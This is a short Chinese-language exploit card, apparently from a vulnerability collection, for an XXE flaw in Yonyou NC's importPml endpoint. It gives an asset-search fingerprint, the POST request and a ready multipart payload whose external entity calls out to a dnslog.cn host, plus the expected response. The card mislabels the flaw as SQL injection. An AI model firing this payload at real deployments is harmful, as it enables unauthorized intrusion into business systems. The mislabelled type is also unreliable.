# 用友NCimportPml存在XML注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/portalpage/importPml?pageId=login HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybXJ4bi5u…`

**请求体 / payload**
```
------WebKitFormBoundarybXJ4bi5uZXQ
Content-Disposition: form-data; name="file"; filename="1.png"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://xxe.f87a63.dnslog.cn">
]>
<root>
<TextResult>&xxe;</TextResult>
</root>
------WebKitFormBoundarybXJ4bi5uZXQ--
```
- **预期**：200　|　—